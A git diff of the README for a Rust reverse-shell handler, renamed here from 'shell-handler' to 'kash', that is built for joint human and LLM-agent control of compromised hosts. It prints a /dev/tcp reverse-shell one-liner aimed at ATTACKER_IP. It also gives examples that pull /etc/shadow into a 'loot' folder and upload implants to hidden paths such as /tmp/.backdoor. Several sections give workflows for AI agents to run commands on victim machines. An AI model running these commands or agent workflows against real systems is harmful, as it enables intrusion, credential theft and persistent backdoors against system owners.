@@ -1,4 +1,4 @@
-# shell-handler
+# kash
 
 A reverse shell handler written in Rust. Designed for ergonomic human use and LLM/agent automation simultaneously — both share the same live shell session without conflict. Start a listener in the background with `-d`, then attach interactively from any terminal — like `docker run -d` / `docker exec -it`.
 
@@ -8,30 +8,31 @@ A reverse shell handler written in Rust. Designed for ergonomic human use and LL
 
 ```bash
 # Background listener — terminal freed immediately
-shell-handler listen 4444 -d
-#   [*] session: a1b2c3d4
-#   [*] listening in background — attach with: shell-handler attach a1b2c3d4
+kash listen 4444 -d
+#   obfuscation  : none
+#   session id   : monkey
+#   [*] listening in background — attach with: kash attach monkey
 
 # On the target:
 bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
 
 # Attach interactively from any terminal (raw PTY passthrough, vim/htop work):
-shell-handler attach a1b2c3d4
+kash attach monkey
 
 # From another terminal (or LLM): inject commands into the live session
-shell-handler exec a1b2c3d4 whoami
+kash exec monkey whoami
 ```
 
 ### Interactive mode (no -d)
 
 ```bash
 # Drop into the session directly — Terminal 1 becomes the interactive console
-shell-handler listen 4444
+kash listen 4444
 
 # Leave without closing the connection (CTRL+Q → handler mode → detach):
 # The process auto-suspends; type 'bg' in your shell to resume in background.
 # Then reconnect from any terminal:
-shell-handler attach a1b2c3d4
+kash attach monkey
 ```
 
 ---
@@ -43,7 +44,7 @@ shell-handler attach a1b2c3d4
 Start a TCP listener and drop into an interactive shell session when a reverse connection arrives.
 
 ```
-shell-handler listen <PORT> [OPTIONS]
+kash listen <PORT> [OPTIONS]
 ```
 
 | Argument / Flag | Default | Description |
@@ -57,14 +58,16 @@ shell-handler listen <PORT> [OPTIONS]
 
 Examples:
 ```bash
-shell-handler listen 4444
-shell-handler listen 4444 -d                        # background immediately
-shell-handler listen 4444 -o light -s linux
-shell-handler listen 443 -l 10.0.0.5 --session mysession
-shell-handler listen 443 -d --session mysession     # pinned ID, daemonized
+kash listen 4444
+kash listen 4444 -d                        # background immediately
+kash listen 4444 -o light -s linux
+kash listen 443 -l 10.0.0.5 --session mysession
+kash listen 443 -d --session mysession     # pinned ID, daemonized
 ```
 
 The session ID is printed in the startup banner and used by all other subcommands.
+
+By default the ID is a short animal name (`monkey`, `tiger`, `panda`, …) picked from a built-in list — short enough to type by hand. Names already used by an active session are skipped, so two sessions never share an animal; if the whole list is taken, a numeric suffix is added (`tiger2`). Use `--session <id>` to pin a specific name.
 
 ---
 
@@ -73,7 +76,7 @@ The session ID is printed in the startup banner and used by all other subcommand
 List all active shell sessions on this host.
 
 ```
-shell-handler ps [OPTIONS]
+kash ps [OPTIONS]
 ```
 
 | Flag | Description |
@@ -83,15 +86,15 @@ shell-handler ps [OPTIONS]
 
 Examples:
 ```bash
-shell-handler ps
+kash ps
 # SESSION     PEER                    IDENTITY              OBFUSCATION  SHELL
-# a1b2c3d4    192.168.1.100:55705     www-data@targetbox    heavy        linux
+# monkey      192.168.1.100:55705     www-data@targetbox    heavy        linux
 
-shell-handler ps -q
-# a1b2c3d4
+kash ps -q
+# monkey
 
-shell-handler ps --json
-# [{"id":"a1b2c3d4","peer":"192.168.1.100:55705","user":"www-data","host":"targetbox","obfuscation":"heavy","shell":"linux"}]
+kash ps --json
+# [{"id":"monkey","peer":"192.168.1.100:55705","user":"www-data","host":"targetbox","obfuscation":"heavy","shell":"linux"}]
 ```
 
 Session detection works by scanning `/tmp/.shh-*.sock`. No daemon is needed.
@@ -103,7 +106,7 @@ Session detection works by scanning `/tmp/.shh-*.sock`. No daemon is needed.
 Inject a command into a running session and return its output. This is the primary interface for LLM/agent automation.
 
 ```
-shell-handler exec [OPTIONS] <SESSION-ID> [--cmd <CMD> | <COMMAND...>]
+kash exec [OPTIONS] <SESSION-ID> [--cmd <CMD> | <COMMAND...>]
 ```
 
 | Argument / Flag | Default | Description |
@@ -119,32 +122,32 @@ shell-handler exec [OPTIONS] <SESSION-ID> [--cmd <CMD> | <COMMAND...>]
 
 ```bash
 # Simple commands — trailing tokens are fine
-shell-handler exec a1b2c3d4 whoami
-shell-handler exec a1b2c3d4 ls -la /etc
+kash exec monkey whoami
+kash exec monkey ls -la /etc
 
 # Complex commands — always use --cmd
-shell-handler exec a1b2c3d4 --cmd "python3 -c \"print('hello')\""
-shell-handler exec a1b2c3d4 --cmd "cat /etc/passwd | grep root"
-shell-handler exec a1b2c3d4 --cmd "for f in /tmp/*.txt; do echo \$f; done"
+kash exec monkey --cmd "python3 -c \"print('hello')\""
+kash exec monkey --cmd "cat /etc/passwd | grep root"
+kash exec monkey --cmd "for f in /tmp/*.txt; do echo \$f; done"
 
 # JSON output — designed for LLM consumption
-shell-handler exec --format json a1b2c3d4 --cmd "id"
+kash exec --format json monkey --cmd "id"
 # {"output":"uid=33(www-data) gid=33(www-data)...\n","exit_code":0}
 
-shell-handler exec --format json a1b2c3d4 cat /etc/passwd
+kash exec --format json monkey cat /etc/passwd
 # {"output":"root:x:0:0:root:/root:/bin/bash\n...","exit_code":0}
 ```
 
 #### Why `--cmd` exists: the two-shell quoting problem
 
-Every command passes through **two** shells: the LLM's shell (which processes the arguments to `shell-handler`) and the **remote target shell** (which executes the decoded, deobfuscated command). Single quotes in particular are fragile:
+Every command passes through **two** shells: the LLM's shell (which processes the arguments to `kash`) and the **remote target shell** (which executes the decoded, deobfuscated command). Single quotes in particular are fragile:
 
 ```
-shell-handler exec abc "python3 -c print('test')"
+kash exec monkey "python3 -c print('test')"
                            ↓
   Your shell strips outer "…" — ok, one argument
                            ↓
-  shell-handler joins tokens → python3 -c print('test')
+  kash joins tokens → python3 -c print('test')
                            ↓
   Obfuscation encodes it → eval "$(echo '...' | base64 -d)"
                            ↓
@@ -155,11 +158,11 @@ shell-handler exec abc "python3 -c print('test')"
 With `--cmd` and correct quoting for the **remote shell**:
 
 ```
-shell-handler exec abc --cmd "python3 -c \"print('hello')\""
+kash exec monkey --cmd "python3 -c \"print('hello')\""
                            ↓
   Your shell strips outer "…", keeps \" as " → python3 -c "print('hello')"
                            ↓
-  shell-handler passes this string to obfuscation unchanged
+  kash passes this string to obfuscation unchanged
                            ↓
   Remote bash decodes → python3 -c "print('hello')"
   Remote bash processes inner "…" → Python gets print('hello') → ok ✓
@@ -167,11 +170,11 @@ shell-handler exec abc --cmd "python3 -c \"print('hello')\""
 
 #### LLM subprocess pattern (recommended)
 
-When an LLM calls shell-handler as a subprocess (no intermediate shell), pass the command as a single `--cmd` argument. The string is taken verbatim — no escaping needed beyond what the remote shell requires:
+When an LLM calls kash as a subprocess (no intermediate shell), pass the command as a single `--cmd` argument. The string is taken verbatim — no escaping needed beyond what the remote shell requires:
 
 ```python
 subprocess.run([
-    "shell-handler", "exec", session_id,
+    "kash", "exec", session_id,
     "--cmd", "python3 -c \"print('hello')\"",
     "--format", "json",
 ])
@@ -191,12 +194,12 @@ Behaviour:
 Show detailed metadata for a single session, including timing and command history.
 
 ```
-shell-handler inspect <SESSION-ID>
+kash inspect <SESSION-ID>
 ```
 
 Example output:
 ```
-  Session       a1b2c3d4
+  Session       monkey
   Peer          192.168.1.100:55705
   Identity      www-data@targetbox
   Obfuscation   heavy
@@ -222,7 +225,7 @@ Fields shown only in `inspect` (not in `ps`):
 Terminate a running session gracefully.
 
 ```
-shell-handler kill <SESSION-ID>
+kash kill <SESSION-ID>
 ```
 
 Sends a kill signal over the IPC socket. The interactive session prints a notice and exits cleanly. Socket and metadata files are removed automatically.
@@ -234,13 +237,13 @@ Sends a kill signal over the IPC socket. The interactive session prints a notice
 Re-attach an interactive terminal to a detached session.
 
 ```
-shell-handler attach <SESSION-ID>
+kash attach <SESSION-ID>
 ```
 
 Example:
 ```bash
-shell-handler attach a1b2c3d4
-# [+] attached to session a1b2c3d4  ·  CTRL+Q to detach
+kash attach monkey
+# [+] attached to session monkey  ·  CTRL+Q to detach
 ```
 
 - Enters raw PTY passthrough mode immediately — all keystrokes forwarded byte-for-byte.
@@ -258,7 +261,7 @@ See also: **detach** meta-command in handler mode below.
 Upload a local file to the remote system via a running session.
 
 ```
-shell-handler upload <SESSION-ID> <LOCAL> [REMOTE]
+kash upload <SESSION-ID> <LOCAL> [REMOTE]
 ```
 
 | Argument | Default | Description |
@@ -269,8 +272,8 @@ shell-handler upload <SESSION-ID> <LOCAL> [REMOTE]
 
 Examples:
 ```bash
-shell-handler upload a1b2c3d4 ./implant.elf /tmp/.x
-shell-handler upload a1b2c3d4 loot.txt              # → ./loot.txt on remote
+kash upload monkey ./implant.elf /tmp/.x
+kash upload monkey loot.txt              # → ./loot.txt on remote
 ```
 
 Runs the full file transfer protocol (base64 heredoc + SHA256 verification) through the session's live TCP connection. Progress and result are shown in the interactive session terminal. The exit code is `0` on success, `1` on failure.
@@ -282,7 +285,7 @@ Runs the full file transfer protocol (base64 heredoc + SHA256 verification) thro
 Download a file from the remote system via a running session.
 
 ```
-shell-handler download <SESSION-ID> <REMOTE> [LOCAL]
+kash download <SESSION-ID> <REMOTE> [LOCAL]
 ```
 
 | Argument | Default | Description |
@@ -293,8 +296,8 @@ shell-handler download <SESSION-ID> <REMOTE> [LOCAL]
 
 Examples:
 ```bash
-shell-handler download a1b2c3d4 /etc/passwd
-shell-handler download a1b2c3d4 /etc/shadow loot/shadow.txt
+kash download monkey /etc/passwd
+kash download monkey /etc/shadow loot/shadow.txt
 ```
 
 ---
@@ -346,13 +349,13 @@ Two ways to leave a session without closing the TCP connection:
 
 ```bash
 # Listener runs in background — terminal freed immediately
-shell-handler listen 9001 -d
-# [*] session: a1b2c3d4
-# [*] listening in background — attach with: shell-handler attach a1b2c3d4
+kash listen 9001 -d
+#   session id   : monkey
+#   [*] listening in background — attach with: kash attach monkey
 
 # Attach from any terminal whenever you need interactive access
-shell-handler attach a1b2c3d4
-# [+] attached to session a1b2c3d4  ·  CTRL+Q to detach
+kash attach monkey
+# [+] attached to session monkey  ·  CTRL+Q to detach
 
 # Detach with CTRL+Q — session keeps running, terminal returned immediately
 # Re-attach any number of times from any terminal
@@ -365,20 +368,20 @@ If you started without `-d` and want to leave:
 ```bash
 # Type directly at the shell prompt (raw PTY or handler mode):
 detach
-# [*] session a1b2c3d4 detached
+# [*] session monkey detached
 #     ├ type 'bg' in your shell to resume in background
-#     └ shell-handler attach a1b2c3d4 to reconnect
+#     └ kash attach monkey to reconnect
 
 # The process auto-suspends (SIGTSTP) — your shell shows it stopped.
 # Type 'bg' once to resume it in the background:
 bg
 # Then from any terminal:
-shell-handler attach a1b2c3d4
+kash attach monkey
 ```
 
 While detached (either way):
 - The TCP connection stays alive — the remote shell keeps running.
-- `shell-handler exec` and `shell-handler ps/inspect` work normally.
+- `kash exec` and `kash ps/inspect` work normally.
 - Incoming TCP output is silently drained so the remote shell never stalls on a full buffer.
 
 ### Auto-upgrade on connect
@@ -432,7 +435,7 @@ All keystrokes are forwarded byte-for-byte to the remote. Meta-commands (`upload
 | **↑ / ↓** | History navigation (up to 1000 entries, no consecutive duplicates) |
 | **Alt+Enter** | Insert newline (multiline input) |
 
-#### Attach mode (`shell-handler attach`)
+#### Attach mode (`kash attach`)
 
 All keystrokes are forwarded byte-for-byte, same as raw PTY mode. The only locally-handled keys are:
 
@@ -466,27 +469,27 @@ A human and an LLM can operate the same live shell at the same time.
 2. LLM commands arrive via a Unix socket (`/tmp/.shh-<id>.sock`) and are serialised through an internal channel — only one can run at a time.
 3. While an LLM command runs, the human sees `[agent running...]` and pressing **Enter** shows a "busy" hint instead of sending.
 4. **CTRL+C** in the interactive terminal cancels the running LLM command with exit code `130`.
-5. While an interactive client is attached via `shell-handler attach`, agent commands (`exec`) are blocked and immediately return exit code `1`. Detach the interactive client first to resume automated use.
+5. While an interactive client is attached via `kash attach`, agent commands (`exec`) are blocked and immediately return exit code `1`. Detach the interactive client first to resume automated use.
 
 **Typical LLM workflow:**
 
 ```bash
 # 1. Find available sessions
-SESSION=$(shell-handler ps -q | head -1)
+SESSION=$(kash ps -q | head -1)
 
 # 2. Run a command and capture structured output
-RESULT=$(shell-handler exec --format json "$SESSION" --cmd "id")
+RESULT=$(kash exec --format json "$SESSION" --cmd "id")
 # {"output":"uid=33(www-data) gid=33(www-data)...\n","exit_code":0}
 
 # 3. Check success by exit code
-shell-handler exec "$SESSION" --cmd "test -w /etc" && echo "writable"
+kash exec "$SESSION" --cmd "test -w /etc" && echo "writable"
 
 # 4. Chain commands — use --cmd for anything with special chars
-shell-handler exec "$SESSION" --cmd "cat /etc/passwd | grep -v nologin"
-shell-handler exec "$SESSION" --cmd "find /var/www -name '*.php' -mtime -1"
+kash exec "$SESSION" --cmd "cat /etc/passwd | grep -v nologin"
+kash exec "$SESSION" --cmd "find /var/www -name '*.php' -mtime -1"
 
 # 5. Python one-liner (inner quotes use the remote shell's quoting rules)
-shell-handler exec "$SESSION" --cmd "python3 -c \"import os; print(os.getuid())\""
+kash exec "$SESSION" --cmd "python3 -c \"import os; print(os.getuid())\""
 ```
 
 ---
@@ -507,11 +510,11 @@ upload ./payload.sh            # remote path defaults to ./payload.sh
 **From another terminal or script** (via session IPC):
 
 ```bash
-shell-handler upload a1b2c3d4 ./implant.elf /tmp/.x
-shell-handler download a1b2c3d4 /etc/shadow loot/shadow.txt
+kash upload monkey ./implant.elf /tmp/.x
+kash download monkey /etc/shadow loot/shadow.txt
 
 # Works in LLM/agent pipelines:
-shell-handler upload "$SESSION" ./agent_payload /tmp/.backdoor
+kash upload "$SESSION" ./agent_payload /tmp/.backdoor
 ```
 
 Both forms run the same transfer protocol through the session's live TCP connection and return the same progress display and SHA256 result.
@@ -575,7 +578,7 @@ If neither sha tool is available, transfer still completes — the hash check is
 
 ## Session files
 
-Each active session owns two files in `/tmp`:
+Each active session owns two files in `/tmp`, where `<id>` is the session ID (an animal name by default, e.g. `/tmp/.shh-monkey.sock`):
 
 | File | Content |
 |---|---|
@@ -615,5 +618,5 @@ Requires Rust 1.85+ (edition 2024).
 
 ```bash
 cargo build --release
-# binary: target/release/shell-handler
+# binary: target/release/kash
 ```
